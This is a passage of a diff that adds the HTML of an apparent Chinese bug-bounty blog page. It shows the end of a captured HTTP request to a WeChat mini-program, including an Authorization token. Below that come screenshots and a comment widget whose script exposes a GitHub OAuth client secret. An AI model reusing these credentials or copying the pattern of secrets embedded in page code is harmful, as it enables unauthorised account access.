class="section">Xweb_xhr: 1</span></span><br><span class="line"><span class="section">Authorization: Token ZXlKcmFXUWlPaUl3SWl3aWRIbHdJam9pU2xkVUlpd2lZV3huSWpvaVNGTXlOVFlpZlEuZXlKcFlYUWlPakUzTXpNNE9UVTROekFzSW5OMVlpSTZJbXh2WjJsdUlpd2lhWE56SWpvaWQyVmtjeUlzSW1WNGNDSTZNVGN6TkRVd01EWTNNQ3dpY0dGc1p5STZJbUZsY3kweU5UWXRZMkpqSWl3aWNHdGxlV2xrSWpvaU1TSXNJbXAwYVNJNklqRTVOekF5TVdGd2NDMWhjR2xzYjJkcGJpSXNJbUYxWkNJNkltRndjQzFoY0draUxDSndaR0YwWVNJNklqVTRaakkyTUdVek1XVTJNamxrTVdSak1USTJObU15TnpRM1pXRXpNV0UyT0dVMlkyTm1ZelJtWm1OaE1HRTFOamswT0dJeE16ZGpaRFZqTW1JeVpXWTNPVFV6WkRGa01EaGxaVEl6TlRneFltSXdNMlprWmpSa01qaGtaREJtTVRNM056azBObVl4T1RBelpUQmpOV0l6TlRJMU1USTNOV1l6TmpFNE9EWmpaREl6TUdZellXVmlNakJrTVdNNFpHSXlOVFV6TWpJek1UQTFPVEU1TmpNd1ptUm1OVGRpTVRVNU1EY3pNamN6WkRFek9ETmlPRE01TXpFMU1tSTJabVZsT1dFNVpURTBabU0zTW1JelpHUmpNR1ppWXpjd1pqUmlZMll5WVRNM09ESTVOamd4WldSaE5qYzRNRE0wWldZM05qQmxOalE0TW1Zd01USXdaVEFpZlEuSXhBdmZqX0RFci0tMjdFci1IeEJsckpsOWlPRm1lRjhpeFNoUWFkQVN6WQ==</span></span><br><span class="line"><span class="section">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x63090c11)XWEB/11275</span></span><br><span class="line"><span class="section">Content-Type: application/json</span></span><br><span class="line"><span class="section">Sec-Fetch-Site: cross-site</span></span><br><span class="line"><span class="section">Sec-Fetch-Mode: cors</span></span><br><span class="line"><span class="section">Sec-Fetch-Dest: empty</span></span><br><span class="line"><span class="section">Referer: https://servicewechat.com/wx4294667ee315a00a/312/page-frame.html</span></span><br><span class="line"><span class="section">Accept-Encoding: gzip, deflate, br</span></span><br><span class="line"><span class="section">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="section">Connection: keep-alive</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/11.png" alt="11"></p>
+<p><img src="/%E6%9C%AA%E5%85%AC%E5%BC%80/SRC-%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E7%A7%AF%E7%B4%AF.html/12.png" alt="12"></p>
+
+        </section>
+    </article>
+</div>
+
+    <div id="gitalk-container"></div>
+    
+<link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
+<script src="//unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: 'Ov23liYIgvRGmOua7FRQ',
+        clientSecret: '3771339a3942e824992a8e506a5da60cdaa45391',
+        repo: 'comment',
+        owner: 'G00d-R',
+        admin: 'G00d-R',
+        id: md5(location.pathname),      
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 100,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© G00d
+            
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    >总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>@
+</span>
+
+              
+              2022 - 2025
+
+            </span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
